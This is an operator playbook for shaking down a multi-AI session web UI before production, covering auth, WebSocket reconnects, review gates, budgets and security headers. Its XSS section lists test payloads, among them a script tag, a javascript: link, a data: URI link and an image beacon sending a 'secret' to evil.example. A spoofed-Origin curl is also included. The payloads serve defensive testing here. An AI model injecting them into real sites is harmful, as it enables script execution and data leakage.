# Phase 2 Web UI — Test Playbook

**Audience**: SACP operators shaking down the Phase 2 Web UI before production use.
**Output**: a live session where every shipped user story is exercised and every security control is verified.
**Time**: ~45–60 minutes end-to-end.

All test IDs map to the acceptance scenarios in [specs/011-web-ui/spec.md](../specs/011-web-ui/spec.md) and the security requirements SR-001..SR-008.

---

## 0. Prerequisites

**Before starting:**
- `docker compose` stack running (`sudo bash -c "docker compose down && docker compose pull && docker compose up -d"`)
- Port 8750 (MCP) and 8751 (Web UI) reachable
- At least two real AI API keys on hand (OpenAI + Anthropic, or two of either) — the tests need multi-AI sessions
- Browser DevTools familiarity (Network → WS panel, Application → Storage, Console)

**Environment variables required in `docker-compose.yml` for production**:
- `SACP_WEB_UI_ALLOWED_ORIGINS` — e.g. `http://your-host:8751`
- `SACP_WEB_UI_MCP_ORIGIN` — e.g. `http://your-host:8750`

For local runs, defaults cover `localhost:8751` / `127.0.0.1:8751`.

---

## 1. Boot smoke (5 min)

Goal: confirm the stack starts without errors and both ports respond.

| ID | Check | Pass |
|---|---|---|
| B1 | `curl http://<host>:8750/docs` returns Swagger HTML | ☐ |
| B2 | `curl http://<host>:8751/healthz` returns `{"status":"ok"}` | ☐ |
| B3 | `curl http://<host>:8751/` returns the SPA HTML (contains "SACP Web UI") | ☐ |
| B4 | `docker logs sacp-sacp-1 2>&1 \| grep -i error` is empty or benign | ☐ |
| B5 | Browser console at `http://<host>:8751/` shows no CSP violations, SPA renders AuthGate | ☐ |

**If B5 fails with CSP errors**: most likely `'unsafe-eval'` is missing from the CSP or CDN script URLs don't match. Check `src/web_ui/security.py::_CSP` against `frontend/index.html`.

---

## 2. Auth + session creation (5 min)

| ID | Step | Expected |
|---|---|---|
| A1 | Create session via Swagger `/tools/session/create` with `{name:"playbook", display_name:"You"}` | Returns `session_id`, `facilitator_id`, `auth_token` — **copy the token** |
| A2 | Paste token in AuthGate, click Sign in | Redirected to SessionView within 2s |
| A3 | DevTools → Application → Storage: check localStorage + sessionStorage + IndexedDB | No bearer token anywhere (FR-003) |
| A4 | DevTools → Application → Cookies | `sacp_ui_token` present with HttpOnly + SameSite=Strict flags |
| A5 | DevTools → Network → WS → open frame stream | First frame is `state_snapshot` (`v:1, type:"state_snapshot"`) |

---

## 3. US1 — Facilitator flow (10 min)

**Setup**: add two AI participants via the "+ Add participant" button. Use Claude Haiku + GPT-4o-mini (cheapest multi-AI config).

| ID | Step | Expected |
|---|---|---|
| US1.1 | Add Claude participant (provider=anthropic, model=`anthropic/claude-haiku-4-5-20251001`, real key) | New card appears in left sidebar within 1s |
| US1.2 | Add GPT participant (provider=openai, model=`gpt-4o-mini`, real key) | Same |
| US1.3 | Type "Discuss the trolley problem" in center textarea, Ctrl+Enter | Message appears in transcript with your display_name header |
| US1.4 | Click **Start loop** | Status badge flips `paused → active` |
| US1.5 | Wait ~30s | At least one AI turn appears with full content rendered as markdown |
| US1.6 | Click **Pause** | Status badge flips back, loop stops mid-cycle |

**Expected WS frames during US1.5**: `message` events with full `content`/`speaker_type`/`created_at` (not the earlier empty-payload bug), plus `participant_update` with fresh `spend_daily`, plus `convergence_update`.

---

## 4. US8 — XSS hardening (10 min)

The highest-risk surface. Inject these payloads as human messages (Ctrl+Enter) and confirm the rendered output neutralizes each:

| ID | Payload | Expected render |
|---|---|---|
| X1 | `<script>alert(1)</script>` | Literal text, no alert fires |
| X2 | `![img](https://evil.example/pixel?d=secret)` | `[Image: img]` inline text, no network request to evil.example (check Network tab) |
| X3 | `[click](javascript:alert(1))` | Rendered as `⚠ click` warning span; clicking does nothing |
| X4 | Literal text `hello\u200bworld` (paste a string with ZWS) | Shows `hello[ZWS]world` + "⚠ 1 hidden" badge on the message header |
| X5 | `<iframe src="about:blank"></iframe>` | Iframe stripped; literal text only |
| X6 | `<a href="data:text/html,<h1>xss" target="_blank">fake link</a>` | Link blocked (data: scheme rejected) |

**Also verify** DevTools → Console is clean (no CSP violations from your own payloads).

---

## 5. US2 — Participant view + role gating (5 min)

**Setup**: create a second participant via Swagger (`POST /tools/facilitator/add_participant` with `{display_name:"Tester", provider:"human"}`), grab their token, open `http://<host>:8751/` in a **different browser or incognito window**.

| ID | Check | Expected |
|---|---|---|
| U2.1 | Log in as the non-facilitator participant | SessionView loads |
| U2.2 | Inspect left sidebar | "+ Add participant" button **absent** |
| U2.3 | Inspect session controls panel | Pause / Resume / Start / Stop / Archive buttons **absent** |
| U2.4 | Inspect left sidebar admin section | No `<details>` for pending approvals / invite / transfer |
| U2.5 | Inspect right sidebar review-gate panel | Queue visible but Approve/Edit/Reject buttons **absent** |
| U2.6 | Change your own routing preference via SelfControls | If facilitator-only, shows 🔒 with tooltip pointing at T250 |

---

## 6. US3 — WebSocket resilience (5 min)

| ID | Step | Expected |
|---|---|---|
| W1 | `sudo docker compose restart sacp` (container bounce mid-session) | UI shows **"Reconnecting to server…"** banner within 3s |
| W2 | Wait for container to come back (~10s) | Banner clears, fresh `state_snapshot` arrives in WS panel |
| W3 | Open DevTools Console — mark reconnect timing | Reconnect succeeds within 30s total (SC-003) |
| W4 | In an admin session, `POST /tools/facilitator/revoke_token` against your own participant | WS closes with code **4401**, UI redirects to AuthGate with "Your session expired" banner |
| W5 | Network → WS → Send a custom `{"v":1,"type":"bogus"}` frame | Console shows `[ws] unknown event type: bogus`, no state corruption |

---

## 7. US5 — Review gate (10 min)

| ID | Step | Expected |
|---|---|---|
| R1 | Via Swagger: `POST /tools/facilitator/set_routing_preference` with `{participant_id: <Claude id>, preference: "review_gate"}` | 200 OK |
| R2 | Let the loop run one cycle | Draft appears in right-sidebar "Review gate" panel with participant name + content preview + Approve / Edit / Reject buttons |
| R3 | Click Approve | Draft disappears from queue; content lands in transcript with correct speaker attribution |
| R4 | Trigger another draft, click Edit | Modal opens with pre-filled text |
| R5 | Modify text, save | Edited content lands in transcript |
| R6 | Trigger another draft, click Reject | Draft disappears; no transcript update |
| R7 | Facilitator toggles pause-scope selector in panel header from `session` → `participant` | Next drafts from AI-A don't block AI-B's turns (vs session-scope blocks everyone) |

---

## 8. US6 — Admin panel (5 min)

| ID | Step | Expected |
|---|---|---|
| AD1 | Create a third pending participant via invite flow (create_invite → copy token → sign in in another browser) | Pending participant shows up in Admin → Pending approvals |
| AD2 | Click Approve | Participant flips to active; pending row disappears |
| AD3 | Admin → Invite → Generate invite | Token printed; Copy button copies to clipboard |
| AD4 | Admin → Session config → change cadence to `sprint` | Selector persists; audit log entry `set_cadence_preset` appears |
| AD5 | Admin → Audit log | Shows last ~5 facilitator actions in reverse-chronological order within 2s of each action (T252 WS push) |
| AD6 | Admin → Transfer facilitator → click on the AI participant | **Should not be allowed** (transfer to pending/AI is rejected server-side) |

---

## 9. US4 — Budget + convergence dashboards (5 min)

**Setup**: Via Swagger, set a small daily budget on one AI: `POST /tools/facilitator/set_budget` with `{participant_id: <id>, budget_daily: 0.05}`.

| ID | Check | Expected |
|---|---|---|
| D1 | After a turn or two, Budget panel card for that participant | Utilization bar advances, changes color when >50%/>95% |
| D2 | View a non-facilitator participant's Budget panel | Other participants show **percentage only** (no dollar amounts) |
| D3 | Convergence panel after 3+ turns | SVG sparkline with ≥3 data points, threshold line at y≈0.85 |
| D4 | Turn that crosses 0.85 | Red dot marker on the sparkline for that turn |

---

## 10. US9 — Summary viewer (5 min)

**Setup**: Let the session run past 10 turns to trigger automatic summarization (threshold configurable via `SACP_SUMMARIZER_THRESHOLD`, default 10).

| ID | Check | Expected |
|---|---|---|
| SM1 | Summary panel before turn 10 | Placeholder "No checkpoint yet — summaries run every 10 turns" |
| SM2 | After turn 10 completes | Panel populates with Decisions / Open Questions / Key Positions / Narrative sections |
| SM3 | Each section renders content | Lists / paragraphs, non-empty (parsed JSON from LLM) |
| SM4 | Reconnect mid-session (W1-style restart) | Summary survives reconnect (state_snapshot carries it) |

---

## 11. US10 — Health indicators (5 min)

**Setup**: `POST /tools/facilitator/debug_set_timeouts` with `{participant_id: <id>, consecutive_timeouts: 2}`.

| ID | Check | Expected |
|---|---|---|
| H1 | Participant card shows health badge | `warning (2)` in yellow |
| H2 | Bump to 3 (let loop fail once or set via debug) | Badge flips to red `breaker-tripped` |
| H3 | Hover badge | Tooltip with last 3 skip reasons from `turn_skipped` WS events |
| H4 | Non-facilitator view | Badge still shows; tooltip content may be empty (skip reasons arrive via WS) |

---

## 12. US7 — Proposals (5 min)

| ID | Step | Expected |
|---|---|---|
| P1 | Right-sidebar Proposals panel → "+ New" | Modal opens with Topic + Position fields |
| P2 | Submit `{topic: "Ship feature X?", position: "Ready by Friday"}` | Card appears in panel with tally `0/0/0` and Accept/Reject/Abstain buttons |
| P3 | Click Accept | Vote recorded; tally updates to `1/0/0`; button disables |
| P4 | In second browser (non-facilitator), click Reject | Tally updates to `1/1/0` on both clients |
| P5 | Facilitator clicks "Resolve: accept" | Card disappears from both clients (`proposal_resolved` event) |

---

## 13. Security headers + CSP (5 min)

Verify via `curl -I http://<host>:8751/healthz`:

| ID | Header | Expected value |
|---|---|---|
| S1 | `Content-Security-Policy` | Starts with `default-src 'self'`, contains `'unsafe-eval'`, lists unpkg.com + cdn.jsdelivr.net |
| S2 | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
| S3 | `X-Content-Type-Options` | `nosniff` |
| S4 | `X-Frame-Options` | `DENY` |
| S5 | `Referrer-Policy` | `no-referrer` |
| S6 | `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` |
| S7 | `Cache-Control` | `no-store` |

**Also**:
- `curl -H "Origin: https://evil.example" -I http://<host>:8751/healthz` — no `Access-Control-Allow-Origin` echoes evil.example (SR-003)
- Browser → WS connection → inspect request headers — `Origin` is present and matches your allow-list (SR-004)

---

## 14. Observability sanity (ongoing)

Throughout the run, keep the DevTools WS panel open and confirm these events arrive in reasonable sequence:

- **On login**: `state_snapshot` (once)
- **On each turn**: `message` + `participant_update` (with fresh `spend_daily`) + `convergence_update`
- **On each skip**: `turn_skipped` with a reason
- **On facilitator action**: `audit_entry`
- **On review gate**: `review_gate_staged` then `review_gate_resolved`
- **Every 10 turns**: `summary_created`
- **On proposal actions**: `proposal_created` / `proposal_voted` / `proposal_resolved` (with tally)

**Health check**: every event carries `v: 1` and a `type` field. Unknown types should log to console (`[ws] unknown event type: …`) and not mutate state.

---

## 15. Pre-production checklist

Before exposing beyond localhost:

- ☐ Populate SRI hashes in `frontend/index.html` via `bash scripts/generate_sri_hashes.sh` (task T204)
- ☐ Set `SACP_WEB_UI_ALLOWED_ORIGINS` in `docker-compose.yml` or env
- ☐ Set `SACP_WEB_UI_MCP_ORIGIN` for the CSP `connect-src` scope
- ☐ Remove `SACP_WEB_UI_INSECURE_COOKIES=1` if set (prod should be HTTPS)
- ☐ Confirm TLS in front of 8751 (reverse proxy or similar) — the Web UI does not terminate TLS itself
- ☐ Review and update `SACP_CORS_ORIGINS` on the MCP server to match your production origin

---

## 16. Reporting results

For each section that fails, capture:

1. The ID (e.g. `X3` or `R4`)
2. Actual vs expected behavior, in one sentence
3. DevTools Console / Network / logs excerpt if available
4. Browser, OS, SACP image tag

File as a GitHub issue with label `phase2-shakedown` or drop in your ops notes. Pattern: `fix/phase2-shakedown-<id>-<slug>` branch, tiny PR per issue.

**Known deferred items** (not bugs, don't report):
- All Playwright e2e tests (T058/T074/T085/T094/T103/T115/T126/T134/T143/T154) — shared infra PR pending.
- Session config mutations for `review_gate_timeout` / `min_model_tier` via UI — not exposed yet; use Swagger.
- Branching / sub-session UI — Phase 3.

---

## 17. When you're done

- ☑ All sections pass → Phase 2 is production-ready for your deployment topology.
- ☑ ≥1 section fails → file issues per §16, consider whether the failure is blocking (security / functional) or polish (UX).
- ☑ Want to re-run fast → the Playwright infra PR (once it lands) will automate §3–§12.
